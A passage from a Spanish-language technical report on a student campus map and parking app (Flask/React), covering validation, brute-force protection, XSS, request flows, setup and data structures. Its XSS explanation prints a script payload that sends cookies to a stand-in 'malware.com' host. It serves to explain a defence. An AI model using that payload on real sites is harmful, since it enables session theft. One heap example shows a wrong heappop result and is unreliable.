Durante la actualizacion a bcrypt, se implemento migracion transparente: cuando un usuario con hash legacy hace login, su contrasena se re-hashea automaticamente con bcrypt sin que el usuario lo note. El metodo _needs_rehash() detecta hashes que comienzan con "pbkdf2:" o "scrypt:" y los marca para actualizacion.

## 8.3 VALIDACION DE INPUTS EN DETALLE

### Validacion de boleta

```python
import re

BOLETA_PATTERN = re.compile(r'^\d{7,15}$')

def _validate_boleta(self, boleta):
    if not boleta or not self.BOLETA_PATTERN.match(boleta):
        return False, "La boleta debe tener entre 7 y 15 digitos numericos"
    return True, None
```

Que rechaza esta validacion:
- "" (vacia) → rechazada por "not boleta"
- "abc" → rechazada porque contiene letras
- "123" → rechazada porque tiene menos de 7 digitos
- "12345678901234567" → rechazada porque tiene mas de 15 digitos
- "2025350215" → aceptada (10 digitos numericos)

### Validacion de contrasena

```python
MIN_PASSWORD_LENGTH = 6

def _validate_password(self, password):
    if not password or len(password) < self.MIN_PASSWORD_LENGTH:
        return False, f"La contrasena debe tener al menos {self.MIN_PASSWORD_LENGTH} caracteres"
    return True, None
```

## 8.4 PROTECCION CONTRA FUERZA BRUTA

### Que es un ataque de fuerza bruta

Un ataque de fuerza bruta prueba sistematicamente todas las combinaciones posibles de contrasena hasta encontrar la correcta. Un programa automatico puede probar miles de contrasenas por segundo.

Con rate limiting (5 intentos por minuto), un atacante esta limitado a 300 intentos por hora. Para una contrasena de 6 caracteres alfanumericos hay 2,176,782,336 combinaciones posibles. A 300 intentos por hora, el ataque tardaria 828 anos. Sin rate limiting, a 10,000 intentos por segundo, tardaria solo 2.5 dias.

## 8.5 PROTECCION CONTRA XSS

### Que es XSS

XSS (Cross-Site Scripting) ocurre cuando un atacante logra que su codigo JavaScript se ejecute en el navegador de otro usuario. Por ejemplo, si un alumno se registra con el nombre:

```
<script>document.location='http://malware.com/steal?cookie='+document.cookie</script>
```

Y otro alumno ve este nombre en su dashboard, el script se ejecutaria en su navegador y enviaria sus cookies al atacante.

### Proteccion implementada

React escapa automaticamente todo el contenido renderizado con JSX:

```jsx
<h2>Bienvenido, {user.nombre}</h2>
```

Si user.nombre contiene "<script>alert('hack')</script>", React lo convierte en texto plano visible, no en codigo ejecutable. El usuario veria literalmente el texto "<script>alert('hack')</script>" en la pantalla, pero el script NO se ejecutaria.

Esta proteccion funciona porque React usa createElement() en vez de innerHTML. createElement() crea nodos DOM de texto, no nodos HTML.

## 8.6 VULNERABILIDADES CONOCIDAS Y ACEPTADAS

Para un proyecto escolar, las siguientes vulnerabilidades se documentan como riesgos aceptados:

1. No hay JWT: La sesion se mantiene en localStorage. Un atacante con acceso fisico a la computadora podria leer los datos de sesion. Riesgo bajo: el sistema no maneja datos financieros.

2. CORS permisivo: app.py usa CORS(app) sin restricciones. Cualquier sitio web puede hacer peticiones al backend. En produccion se debe cambiar a: CORS(app, origins=["http://localhost:5173"]).

3. Sin CSRF: No hay tokens CSRF. El riesgo es mitigado porque la API usa JSON, que no puede ser enviado desde formularios HTML clasicos de otros sitios.

4. SECRET_KEY por defecto: config.py usa 'dev-secret-key-change-in-production'. En produccion debe usarse: os.environ.get('SECRET_KEY', os.urandom(24).hex())

5. Validacion de distancia solo en frontend: La validacion de geolocalizacion se ejecuta en JavaScript. Un atacante tecnicamente podria saltarla modificando las peticiones HTTP directamente. Para un proyecto escolar esto es aceptable; en produccion la validacion deberia replicarse en el backend.


# CAPITULO 9. FLUJOS COMPLETOS DEL SISTEMA

## 9.1 FLUJO DE REGISTRO COMPLETO (DIAGRAMA PASO A PASO)

El siguiente diagrama muestra el flujo completo de registro desde que el usuario presiona "Crear cuenta" hasta que entra al sistema:

```
USUARIO                    FRONTEND (React)              BACKEND (Flask)              BASE DE DATOS
   |                            |                              |                           |
   |-- Presiona "Crear cuenta"  |                              |                           |
   |                            |-- setIsRegistering(true)     |                           |
   |                            |-- Muestra formulario         |                           |
   |                            |                              |                           |
   |-- Llena nombre, boleta,    |                              |                           |
   |   contrasena, carrera,     |                              |                           |
   |   vehiculo                 |                              |                           |
   |                            |                              |                           |
   |-- Presiona "Registrarse"   |                              |                           |
   |                            |--POST /auth/register-------->|                           |
   |                            |  {boleta,nombre,password}    |                           |
   |                            |                              |-- validate_boleta()       |
   |                            |                              |-- validate_nombre()       |
   |                            |                              |-- validate_password()     |
   |                            |                              |-- find_by_boleta()------->|
   |                            |                              |                           |--SELECT * FROM alumnos
   |                            |                              |                           |  WHERE boleta=?
   |                            |                              |--Retorna: None
   |                            |                              |-- _hash_password()        |
   |                            |                              |   (bcrypt 4096 rondas)    |
   |                            |                              |-- create()--------------->|
   |                            |                              |                           |--INSERT INTO alumnos
   |                            |                              |                           |  VALUES(...)
   |                            |                              |                           |--COMMIT
   |                            |<--200 {id,boleta,nombre}-----|                           |
   |                            |-- localStorage.setItem()     |                           |
   |                            |-- navigate('/map')           |                           |
   |<--Muestra el mapa----------|                              |                           |
```

Cada flecha horizontal representa una comunicacion entre capas. Las comunicaciones verticales representan procesamiento interno dentro de una capa.

## 9.2 FLUJO DE LOGIN COMPLETO

```
USUARIO                    FRONTEND (React)              BACKEND (Flask)              BASE DE DATOS
   |                            |                              |                           |
   |-- Escribe boleta y pass    |                              |                           |
   |-- Presiona "Ingresar"      |                              |                           |
   |                            |--POST /auth/login----------->|                           |
   |                            |  {boleta, password}          |                           |
   |                            |                              |-- Rate limit check        |
   |                            |                              |   (max 5/min por IP)      |
   |                            |                              |-- validate_boleta()       |
   |                            |                              |-- Alumno.query.filter_by->|
   |                            |                              |                           |--SELECT * FROM alumnos
   |                            |                              |                           |  WHERE boleta = ?
   |                            |                              |                           |
   |                            |                              | CASO A: No existe         |
   |                            |<--401 "Boleta o pass incor"--|                           |
   |<--Muestra error------------|                              |                           |
   |                            |                              |                           |
   |                            |                              | CASO B: Existe sin pass   |
   |                            |<--200 {needs_password:true}--|                           |
   |<--Muestra form contrasena--|                              |                           |
   |                            |                              |                           |
   |                            |                              | CASO C: Existe con pass   |
   |                            |                              |-- check_password_hash()   |
   |                            |                              |   (compara contrasena)    |
   |                            |                              |                           |
   |                            |                              | C1: Pass incorrecta       |
   |                            |<--401 "Boleta o pass incor"--|                           |
   |                            |                              |                           |
   |                            |                              | C2: Pass correcta         |
   |                            |                              |-- _needs_rehash()?        |
   |                            |                              |   SI → _hash_password()   |
   |                            |                              |   bcrypt + UPDATE hash    |
   |                            |                              |-- actualizar last_login-->|
   |                            |                              |                           |--UPDATE alumnos SET
   |                            |                              |                           |  last_login = NOW()
   |                            |<--200 {id,boleta,nombre}-----|                           |
   |                            |-- localStorage.setItem()     |                           |
   |<--Navega al mapa-----------|                              |                           |
```

Nota importante: En los casos A y C1, el mensaje de error es IDENTICO. Esto impide que un atacante distinga entre "la boleta no existe" y "la contrasena esta mal".

## 9.3 FLUJO DE RESERVA DE ESTACIONAMIENTO

```
USUARIO                    FRONTEND (React)              BACKEND (Flask)              BASE DE DATOS
   |                            |                              |                           |
   |-- Abre ParkingPage         |                              |                           |
   |                            |--GET /api/parking/sections-->|                           |
   |                            |                              |--SELECT * FROM sections-->|
   |                            |<--Secciones con dispo.-------|                           |
   |<--Muestra secciones--------|                              |                           |
   |                            |                              |                           |
   |-- Selecciona "Seccion 1"   |                              |                           |
   |                            |--GET .../sections/1/spaces-->|                           |
   |                            |                              |--SELECT * FROM spaces---->|
   |                            |                              |  WHERE section_id = 1     |
   |                            |<--Lista de espacios----------|                           |
   |<--Muestra cajones SVG------|                              |                           |
   |                            |                              |                           |
   |-- Presiona cajon 7         |                              |                           |
   |   (Boton "Reservar")       |                              |                           |
   |                            |-- geolocation.getCurrentPos  |                           |
   |                            |   → lat: 19.329, lon:-99.111 |                           |
   |                            |-- haversineDistance()         |                           |
   |                            |   → distancia: 800m          |                           |
   |                            |-- 800m < 1500m? SI           |                           |
   |                            |                              |                           |
   |                            |--PUT .../spaces/7/status---->|                           |
   |                            |  {status:"reserved",         |                           |
   |                            |   user_boleta:"2025350215"}  |                           |
   |                            |                              |-- Verificar espacio existe|
   |                            |                              |-- Verificar status='avail'|
   |                            |                              |-- _check_user_limits()    |
   |                            |                              |   (no tenga otro activo)  |
   |                            |                              |-- Actualizar espacio----->|
   |                            |                              |   status='reserved'       |
   |                            |                              |   reserved_by='2025350215'|
   |                            |                              |-- Registrar historial---->|
   |                            |                              |   INSERT parking_history   |
   |                            |                              |--COMMIT                   |
   |                            |<--200 espacio actualizado----|                           |
   |<--Cajon cambia a azul------|                              |                           |
   |<--Notificacion "Reservado!"|                              |                           |
```

## 9.4 FLUJO DE OCUPAR UN LUGAR

```
USUARIO                    FRONTEND (React)              BACKEND (Flask)              BASE DE DATOS
   |                            |                              |                           |
   |-- En ParkingPage, presiona |                              |                           |
   |   "Ocupar" en cajon 7      |                              |                           |
   |   (previamente reservado)  |                              |                           |
   |                            |                              |                           |
   |                            |-- geolocation.getCurrentPos  |                           |
   |                            |   → lat: 19.329415           |                           |
   |                            |     lon: -99.111664          |                           |
   |                            |                              |                           |
   |                            |-- Obtener coords de          |                           |
   |                            |   "Seccion 1" del mapa       |                           |
   |                            |   → lat: 19.329415           |                           |
   |                            |     lon: -99.111664          |                           |
   |                            |                              |                           |
   |                            |-- haversineDistance()         |                           |
   |                            |   → distancia: 12m           |                           |
   |                            |-- 12m < 50m? SI              |                           |
   |                            |                              |                           |
   |                            |--PUT .../spaces/7/status---->|                           |
   |                            |  {status:"occupied",         |                           |
   |                            |   user_boleta:"2025350215"}  |                           |
   |                            |                              |-- Verificar espacio existe|
   |                            |                              |-- reserved_by == boleta?  |
   |                            |                              |   SI → permitir ocupar    |
   |                            |                              |-- Actualizar espacio----->|
   |                            |                              |   status='occupied'       |
   |                            |                              |   occupied_by='2025350215'|
   |                            |                              |   reserved_by=NULL        |
   |                            |                              |   reservation_time=NULL   |
   |                            |                              |-- Registrar historial---->|
   |                            |<--200 espacio actualizado----|                           |
   |<--Cajon cambia a rojo------|                              |                           |
   |<--"Lugar ocupado exitosam" |                              |                           |
```

## 9.5 FLUJO DE LIBERAR UN LUGAR

```
USUARIO                    FRONTEND (React)              BACKEND (Flask)              BASE DE DATOS
   |                            |                              |                           |
   |-- Presiona "Liberar"       |                              |                           |
   |   en su cajon ocupado      |                              |                           |
   |                            |--PUT .../spaces/7/status---->|                           |
   |                            |  {status:"available",        |                           |
   |                            |   user_boleta:"2025350215"}  |                           |
   |                            |                              |-- Verificar que           |
   |                            |                              |   occupied_by == boleta   |
   |                            |                              |   o reserved_by == boleta |
   |                            |                              |   (solo el dueno libera)  |
   |                            |                              |-- Limpiar todos campos-->|
   |                            |                              |   status='available'      |
   |                            |                              |   occupied_by=NULL        |
   |                            |                              |   reserved_by=NULL        |
   |                            |                              |-- Registrar historial---->|
   |                            |<--200 espacio actualizado----|                           |
   |<--Cajon cambia a verde-----|                              |                           |
   |<--"Lugar liberado"---------|                              |                           |
```


# CAPITULO 10. GUIA DE EJECUCION

## 10.1 PRERREQUISITOS

Antes de ejecutar el proyecto, necesitas tener instalado:

1. Python 3.8 o superior. Para verificar si esta instalado y la version:
```bash
python3 --version
# Debe mostrar algo como: Python 3.11.5
```

2. Node.js 16 o superior y npm. Para verificar:
```bash
node --version    # Debe mostrar v16.0.0 o superior
npm --version     # Debe mostrar 7.0.0 o superior
```

3. Git. Para clonar el repositorio:
```bash
git --version     # Debe mostrar git version 2.x.x
```

### Que es cada herramienta

- Python: Lenguaje de programacion que ejecuta el backend. Sin Python no puedes correr Flask.
- Node.js: Entorno de ejecucion que permite usar JavaScript fuera del navegador. npm (Node Package Manager) es el gestor de paquetes de JavaScript; permite instalar librerias como React y Leaflet.
- Git: Sistema de control de versiones. Permite descargar el codigo fuente del repositorio.

## 10.2 INSTALACION PASO A PASO

### Paso 1: Clonar el repositorio

```bash
git clone https://github.com/AlexGuittar1/Mapa_interactivo_ESIME_CULHUACAN.git
cd Mapa_interactivo_ESIME_CULHUACAN
```

git clone descarga una copia completa del proyecto, incluyendo todo el historial de cambios. cd cambia el directorio actual al directorio del proyecto.

### Paso 2: Crear el entorno virtual de Python

Un entorno virtual aisla las dependencias de Python del sistema global. Sin entorno virtual, instalar una libreria para este proyecto podria romper otros proyectos en tu computadora.

```bash
cd backend
python3 -m venv venv
source venv/bin/activate     # En macOS/Linux
# venv\Scripts\activate      # En Windows
```

Despues de activar el entorno virtual, veras (venv) al inicio de la linea de comandos. Esto indica que las librerias se instalaran SOLO dentro de la carpeta venv/.

### Paso 3: Instalar dependencias de Python

```bash
pip install -r requirements.txt
```

requirements.txt contiene la lista de librerias necesarias:
```
Flask             → Framework web
flask-cors        → Permite peticiones del frontend
flask-sqlalchemy  → ORM para base de datos
flask-limiter     → Rate limiting para seguridad
networkx          → Algoritmos de grafos
python-dotenv     → Variables de entorno desde .env
bcrypt            → Hashing seguro de contrasenas
gunicorn          → Servidor WSGI para produccion
```

pip descarga cada libreria de PyPI (Python Package Index), un repositorio publico con miles de librerias de Python, y la instala en el entorno virtual.

### Paso 4: Instalar dependencias del frontend

```bash
cd ../frontend
npm install
```

npm install lee el archivo package.json y descarga todas las dependencias de JavaScript a la carpeta node_modules/. Esta carpeta puede pesar cientos de megabytes, por eso esta en .gitignore (no se sube a Git).

### Paso 5: Configurar variables de entorno

```bash
cd ../backend
cp .env.example .env
```

El archivo .env contiene configuraciones sensibles que no deben subirse a Git:
```
APP_ENV=local
SECRET_KEY=dev-secret-key-change-in-production
AZURE_CLIENT_ID=TU_CLIENT_ID
AZURE_TENANT_ID=TU_TENANT_ID
```

Para desarrollo local, los valores por defecto son suficientes.

### Paso 6: Ejecutar el sistema

```bash
cd ..
chmod +x run_app.sh    # Dar permisos de ejecucion al script
./run_app.sh           # Iniciar backend y frontend
```

chmod +x marca el archivo como ejecutable. Sin este paso, el sistema operativo bloquearia la ejecucion del script por seguridad.

El script iniciara:
- Backend en http://localhost:5001
- Frontend en http://localhost:5173

## 10.3 VERIFICACION DE QUE FUNCIONA

1. Abrir http://localhost:5173 en el navegador. Debe aparecer la pagina de login.

2. Probar la API directamente. En otra terminal:
```bash
curl http://localhost:5001/api/buildings
```
Debe retornar una lista JSON de edificios.

3. Registrar un usuario nuevo desde la interfaz con nombre, boleta y contrasena.

4. Hacer login con las credenciales recien creadas.

5. Navegar al mapa y verificar que se muestran los edificios como marcadores.

6. Ir a "Estacionamiento" y verificar que se muestran las secciones con cajones disponibles.

## 10.4 SOLUCION DE PROBLEMAS COMUNES

### Error: "Address already in use" (Puerto ocupado)

Esto ocurre cuando un proceso anterior no se cerro correctamente:
```bash
lsof -ti:5001 | xargs kill -9    # Liberar puerto del backend
lsof -ti:5173 | xargs kill -9    # Liberar puerto del frontend
```

### Error: "ModuleNotFoundError"

Algun modulo de Python no esta instalado. Verifica que el entorno virtual esta activo:
```bash
source backend/venv/bin/activate
pip install -r backend/requirements.txt
```

### Error: "CORS" o "Failed to fetch"

Asegurarse de que AMBOS servidores (backend y frontend) estan corriendo. Si solo corre el frontend, las peticiones al backend fallaran.

### Error: "Database is locked"

SQLite no soporta bien multiples escrituras simultaneas. Reiniciar el backend resuelve el problema:
```bash
lsof -ti:5001 | xargs kill -9
cd backend && python3 app.py &
```


# CAPITULO 11. MEJORAS FUTURAS Y RECOMENDACIONES

## 11.1 AUTENTICACION CON AZURE ACTIVE DIRECTORY

Completar la integracion con Microsoft Azure AD permitiria que los alumnos accedan con su cuenta institucional @alumno.ipn.mx, eliminando la necesidad de crear una cuenta separada.

Implicaciones tecnicas: Se necesita registrar la aplicacion en el portal de Azure, configurar las credenciales (client_id, tenant_id), implementar la validacion del token JWT en el backend, y manejar la creacion automatica de usuarios basada en los claims del token.

Beneficio: Los alumnos no necesitan recordar otra contrasena. Reduccion significativa de cuentas falsas.

## 11.2 MIGRACION A POSTGRESQL

Reemplazar SQLite con PostgreSQL para soportar cientos de usuarios simultaneos. SQLite es excelente para desarrollo pero no para produccion con alta concurrencia.

Gracias al patron de repositorio implementado, esta migracion seria de bajo impacto. Solo se necesitaria:
1. Crear una clase PostgreSQLUserRepository y PostgreSQLScheduleRepository.
2. Actualizar la fabrica de repositorios para incluir la opcion 'postgresql'.
3. Cambiar la cadena de conexion en config.py: 'postgresql://user:pass@host:5432/dbname'

El resto del sistema (servicios, endpoints, frontend) no necesitaria ningun cambio.

## 11.3 SENSORES DE ESTACIONAMIENTO

Integrar sensores fisicos (ultrasonicos o electromagneticos) en cada cajon de estacionamiento para detectar automaticamente si un vehiculo esta presente, eliminando la necesidad de que el usuario marque manualmente su llegada.

Esto requeriria un sistema de IoT (Internet of Things) que envie datos cada pocos segundos al backend, y una API adicional para recibir y procesar esos datos.

## 11.4 NOTIFICACIONES EN TIEMPO REAL

Implementar WebSockets con Flask-SocketIO para enviar notificaciones al usuario sin que este refresque la pagina. Ejemplos:
- "Tu reserva expirara en 5 minutos."
- "El cajon que guardaste como favorito acaba de quedar libre."
- "Tu proxima clase empieza en 15 minutos en el Edificio 3."

Actualmente el frontend debe hacer polling (consultar periodicamente) para obtener actualizaciones. Con WebSockets, el servidor puede enviar datos proactivamente.

## 11.5 JWT PARA SEGURIDAD DE API

Implementar JSON Web Tokens para autenticar las peticiones a la API. Actualmente, cualquiera puede enviar una peticion con una boleta ajena. Con JWT:
1. Al hacer login, el servidor genera un token firmado digitalmente.
2. El frontend incluye ese token en cada peticion: Authorization: Bearer <token>.
3. El backend verifica la firma del token para confirmar la identidad del usuario.
4. El token tiene una fecha de expiracion (por ejemplo, 4 horas).

Esto impediria que un atacante se haga pasar por otro usuario.

## 11.6 PANEL DE ADMINISTRACION

Crear una interfaz web exclusiva para administradores que permita:
- Ver estadisticas en tiempo real: usuarios registrados, ocupacion del estacionamiento, rutas mas solicitadas.
- Gestionar usuarios: bloquear cuentas, restablecer contrasenas, ver historial de actividad.
- Configurar el estacionamiento: agregar/eliminar secciones, cambiar numero de espacios.
- Exportar reportes: uso del estacionamiento por hora/dia/semana, usuarios activos.

## 11.7 APLICACION MOVIL NATIVA

Crear una aplicacion movil con React Native que reutilice gran parte del codigo del frontend actual. Las ventajas sobre la version web incluyen:
- Acceso nativo al GPS con mayor precision.
- Notificaciones push del sistema operativo.
- Funcionamiento sin conexion para consultar horarios guardados.
- Mejor experiencia de usuario en telefonos.

## 11.8 MIGRACIONES DE BASE DE DATOS CON ALEMBIC

Implementar Alembic (la herramienta de migraciones de SQLAlchemy) para manejar cambios en la estructura de la base de datos de forma controlada.

Actualmente, si se agrega un campo nuevo a un modelo, se debe ejecutar ALTER TABLE manualmente o recrear la base de datos. Con Alembic:
```bash
flask db init          # Crear carpeta de migraciones
flask db migrate -m "agregar campo telefono a alumnos"  # Detectar cambios
flask db upgrade       # Aplicar cambios a la base de datos
flask db downgrade     # Revertir el ultimo cambio si hay problemas
```

Cada migracion es un archivo de Python que documenta que cambio se hizo, cuando y por que. Esto permite que multiples desarrolladores trabajen en el mismo proyecto sin romper las bases de datos de los demas.

## 11.9 PRUEBAS AUTOMATIZADAS

Implementar pruebas automatizadas con pytest para verificar que el sistema funciona correctamente despues de cada cambio.

Ejemplo de prueba para el servicio de autenticacion:

```python
def test_register_successful(auth_service):
    """Verificar que un registro exitoso retorna los datos del usuario"""
    data = {
        'boleta': '2025999999',
        'nombre': 'Prueba Test',
        'password': 'password123',
    }
    user, error = auth_service.register(data)
    assert error is None
    assert user['boleta'] == '2025999999'
    assert user['nombre'] == 'Prueba Test'
    assert 'password_hash' not in user  # No exponer el hash

def test_register_duplicate_boleta(auth_service):
    """Verificar que no se puede registrar con boleta duplicada"""
    data = {'boleta': '2025350215', 'nombre': 'Duplicado', 'password': '123456'}
    user, error = auth_service.register(data)
    assert error == "Esta boleta ya esta registrada"
    assert user is None

def test_login_wrong_password(auth_service):
    """Verificar que contrasena incorrecta retorna error generico"""
    data = {'boleta': '2025350215', 'password': 'contrasena_incorrecta'}
    user, error = auth_service.login(data)
    assert error == "Boleta o contrasena incorrecta"
    assert user is None
```

Las pruebas automatizadas permiten:
- Detectar errores antes de que lleguen a produccion.
- Refactorizar codigo con confianza (si las pruebas pasan, el cambio es seguro).
- Documentar el comportamiento esperado del sistema.
- Ejecutar todas las pruebas en segundos con un solo comando: pytest.


# CAPITULO 12. ESTRUCTURAS DE DATOS UTILIZADAS EN EL PROYECTO

Este capitulo explica las estructuras de datos que el proyecto utiliza internamente. Una estructura de datos es una forma de organizar informacion para poder acceder a ella, modificarla y buscarla de manera eficiente. Elegir la estructura correcta para cada problema es una habilidad fundamental en ingenieria de software.

Analogia: Asi como en la vida real organizas la ropa en un closet (por tipo, color o temporada), la cocina con cajones separados para cubiertos, platos y vasos, y la biblioteca con estantes por tema, en programacion organizas los datos en diferentes estructuras segun como necesites usarlos. Usar la estructura equivocada es como guardar los cubiertos en una pila desordenada: funciona, pero es lento e ineficiente.

## 12.1 TABLAS HASH (DICCIONARIOS)

### Que es una tabla hash

Una tabla hash asocia claves con valores, permitiendo buscar un valor por su clave en tiempo constante O(1), es decir, instantaneamente sin importar cuantos datos haya. En Python se llaman diccionarios (dict) y en JavaScript se llaman objetos (object).

Analogia: Una tabla hash es como un directorio telefonico. Si buscas "Omar Sosa", no necesitas leer todos los nombres desde la A hasta la O. Vas directamente a la seccion "S" (la funcion hash te dice donde buscar) y encuentras el numero instantaneamente. Sin importar si el directorio tiene 100 o 1 millon de entradas, la busqueda es igual de rapida.

### Donde se usan en el proyecto

1. Hashes de contrasenas (bcrypt). Cada vez que un alumno se registra, su contrasena se transforma en un hash unico e irreversible:
```python
# El hash ES el valor transformado de la contrasena
hash_resultado = bcrypt.hashpw("nueva123".encode(), bcrypt.gensalt())
# "$2b$12$Rn7mGk8X9Yq2TvW5pLaN3.a1b2c3d4..."
```
El sistema almacena solo el hash, nunca la contrasena original. Al verificar, re-calcula el hash y compara.

2. Diccionarios Python. Los datos viajan entre componentes como diccionarios:
```python
user_data = {
    "boleta": "2025350215",      # clave: "boleta", valor: "2025350215"
    "nombre": "Omar Sosa",       # clave: "nombre", valor: "Omar Sosa"
    "carrera": "ISC",            # clave: "carrera", valor: "ISC"
}
# Acceso instantaneo:
user_data["boleta"]  # → "2025350215"  (O(1), sin importar cuantos campos haya)
```

3. Intercambio de datos via JSON. JSON es esencialmente una tabla hash serializada como texto que viaja entre frontend y backend:
```json
{"boleta": "2025350215", "nombre": "Omar Sosa", "carrera": "ISC"}
```

4. localStorage en el navegador. La sesion del usuario se almacena como un par clave-valor:
```javascript
localStorage.setItem("user", JSON.stringify(userData));  // Guardar
const user = JSON.parse(localStorage.getItem("user"));   // Recuperar en O(1)
```

5. Estado de React (useState). Internamente React usa estructuras de hash para manejar el estado de los componentes:
```jsx
const [spaces, setSpaces] = useState({});
// spaces puede ser: {"1": {status: "available"}, "2": {status: "occupied"}}
// Acceder a spaces["1"] es O(1)
```

### Complejidad algoritmica
- Buscar por clave: O(1) — tiempo constante, instantaneo.
- Insertar un par clave-valor: O(1).
- Eliminar por clave: O(1).
- Buscar por valor (sin clave): O(n) — hay que recorrer todos los pares.

O(1) significa que el tiempo NO crece cuando hay mas datos. O(n) significa que el tiempo crece linealmente (el doble de datos toma el doble de tiempo).

## 12.2 GRAFOS PONDERADOS

### Que es un grafo ponderado

Un grafo es una estructura con nodos (puntos) conectados por aristas (lineas). Si las aristas tienen un valor numerico asociado (llamado peso), el grafo es ponderado. El peso puede representar distancia, tiempo, costo, etc.

Analogia: Piensa en el sistema de metro de la Ciudad de Mexico. Cada estacion es un nodo. Cada tramo entre dos estaciones es una arista. Si a cada tramo le asignas la distancia en metros, tienes un grafo ponderado. Para encontrar la ruta mas corta de Pantitlan a Universidad, necesitas el algoritmo de Dijkstra.

### Como se usa en el proyecto

Los caminos peatonales del campus ESIME Culhuacan forman un grafo ponderado con aproximadamente 431 nodos y 523 aristas:

```python
import networkx as nx

# Crear el grafo
G = nx.Graph()

# Cada interseccion del campus es un nodo (coordenadas GPS)
# Cada segmento de camino es una arista con peso = distancia en metros
G.add_edge(
    (19.329, -99.111),            # Nodo A: coordenadas GPS
    (19.330, -99.112),            # Nodo B: coordenadas GPS
    weight=120.5                   # Distancia entre A y B: 120.5 metros
)

# Para encontrar la ruta mas corta:
ruta = nx.shortest_path(G, source=nodo_origen, target=nodo_destino, weight='weight')
# ruta = [(19.329, -99.111), (19.3295, -99.1115), (19.330, -99.112)]
```

El algoritmo de Dijkstra encuentra la ruta donde la suma de pesos (distancias) es la menor posible. Es como un GPS que calcula la ruta mas corta considerando la distancia real de cada calle.

### Como funciona Dijkstra (explicacion simplificada)

Imagina que estas en una ciudad con calles de diferentes longitudes y quieres llegar a un punto especifico por el camino mas corto:

1. Empiezas en tu ubicacion. La distancia acumulada es 0.
2. Miras todas las calles que salen de donde estas. Anotas la distancia a cada vecino.
3. De todos los vecinos NO visitados, eliges el que tiene la menor distancia acumulada.
4. Desde ese vecino, miras sus calles. Si descubres un camino mas corto a algun nodo, actualizas la distancia.
5. Marcas el nodo actual como "visitado" (ya no lo reconsideras).
6. Repites desde el paso 3 hasta llegar al destino.

El resultado es necesariamente la ruta mas corta.

### Complejidad algoritmica
- Dijkstra con cola de prioridad: O((V + E) × log V), donde V = nodos y E = aristas.
- Para nuestro grafo de 431 nodos y 523 aristas, esto significa unas pocos miles de operaciones: instantaneo para una computadora.

## 12.3 TABLAS RELACIONALES (SQL)

### Que es una tabla relacional

Una tabla relacional organiza datos en filas y columnas, donde las tablas pueden estar conectadas entre si mediante claves foraneas. Es la base de todas las bases de datos SQL.

Analogia: Una hoja de Excel donde cada fila es un registro (un alumno, una materia, un espacio de estacionamiento) y cada columna es un tipo de dato (nombre, boleta, carrera). Lo "relacional" es que puedes vincular hojas entre si. Por ejemplo, la hoja de alumnos tiene una columna "grupo" que apunta a una fila en la hoja de grupos.

### Como se usa en el proyecto

El proyecto tiene 15 tablas distribuidas en dos bases de datos. Ejemplo de relacion:

```python
# Un alumno pertenece a un grupo
class Alumno(db.Model):
    id_grupo = db.Column(db.Integer, db.ForeignKey('grupos.id'))

# Para obtener las materias de un alumno:
alumno = Alumno.query.filter_by(boleta="2025350215").first()
inscripciones = Inscripcion.query.filter_by(alumno_id=alumno.id).all()
for inscripcion in inscripciones:
    grupo = MateriaGrupo.query.get(inscripcion.materia_grupo_id)
    print(f"Materia: {grupo.materia.nombre}, Salon: {grupo.salon.nombre}")
```

Este codigo sigue las relaciones: Alumno → Inscripcion → MateriaGrupo → Materia/Salon. Cada flecha es una clave foranea que conecta dos tablas.

## 12.4 ARREGLOS Y LISTAS

### Que es un arreglo/lista

Un arreglo (array en JavaScript, list en Python) es una coleccion ordenada de elementos accesibles por indice numerico. El primer elemento esta en el indice 0, el segundo en el indice 1, etc.

Analogia: Una fila de casilleros numerados del 0 al 29. Cada casillero contiene un objeto. Si alguien te dice "abre el casillero 7", lo encuentras instantaneamente sin revisar los demas.

### Donde se usan en el proyecto

1. Coordenadas de ruta. La ruta calculada por Dijkstra es una lista de coordenadas GPS:
```python
ruta = [
    [19.329500, -99.111400],   # Punto 0: inicio
    [19.329600, -99.111300],   # Punto 1: primera interseccion
    [19.329800, -99.111000],   # Punto 2: giro
    [19.330100, -99.110800],   # Punto 3: destino
]
# Leaflet dibuja una linea conectando todos estos puntos en orden sobre el mapa
```

2. Lista de espacios de estacionamiento. Los cajones de una seccion se almacenan como arreglo:
```javascript
const spaces = [
    {id: 1, space_number: 1, status: "available"},
    {id: 2, space_number: 2, status: "occupied"},
    {id: 3, space_number: 3, status: "reserved"},
    // ... 30 espacios por seccion
];
// spaces.filter(s => s.status === "available") para obtener solo los disponibles
```

3. Resultados de busqueda. Cuando el usuario busca "Edificio 2", los resultados se devuelven como lista:
```javascript
const resultados = locations.filter(loc =>
    loc.name.toLowerCase().includes("edificio 2")
);
// Puede retornar 0, 1 o multiples coincidencias
```

### Complejidad algoritmica
- Acceder por indice: O(1).
- Buscar un elemento (sin orden): O(n) — necesitas recorrer la lista.
- Agregar al final: O(1).
- Agregar o eliminar al inicio: O(n) — hay que mover todos los elementos.

## 12.5 COLAS DE PRIORIDAD

### Que es una cola de prioridad

Una cola de prioridad es una estructura donde cada elemento tiene una prioridad asociada. El elemento con mayor (o menor) prioridad siempre sale primero, sin importar en que orden se inserto.

Analogia: La sala de emergencias de un hospital. Los pacientes no se atienden por orden de llegada. Un paciente con un infarto (prioridad alta) se atiende antes que uno con dolor de cabeza (prioridad baja), incluso si el del dolor de cabeza llego primero.

### Donde se usa en el proyecto

1. Algoritmo de Dijkstra (internamente). NetworkX usa una cola de prioridad para seleccionar siempre el nodo con la menor distancia acumulada:
```python
# Conceptualmente (NetworkX lo implementa internamente):
import heapq

cola = []
heapq.heappush(cola, (0, nodo_inicio))         # distancia 0 al inicio
heapq.heappush(cola, (120.5, nodo_vecino_1))    # distancia 120.5m al vecino 1
heapq.heappush(cola, (85.3, nodo_vecino_2))     # distancia 85.3m al vecino 2

# heappop siempre extrae el de menor distancia
siguiente = heapq.heappop(cola)  # → (85.3, nodo_vecino_2)
# Dijkstra explora primero el camino mas corto posible
```

Sin una cola de prioridad, Dijkstra tendria que recorrer todos los nodos para encontrar el de menor distancia en cada paso, lo que seria mucho mas lento.

2. Sistema de notificaciones. Las notificaciones tipo toast se manejan con prioridad:
```javascript
// Las notificaciones de error se muestran antes que las informativas
showNotification("Reserva exitosa", "success");     // aparece despues
showNotification("Sin conexion GPS", "error");       // aparece primero (mayor prioridad)
```

### Complejidad algoritmica
- Insertar un elemento: O(log n).
- Extraer el de mayor/menor prioridad: O(log n).
- Consultar el de mayor/menor prioridad (sin extraer): O(1).


# CAPITULO 13. API REST DEL PROYECTO

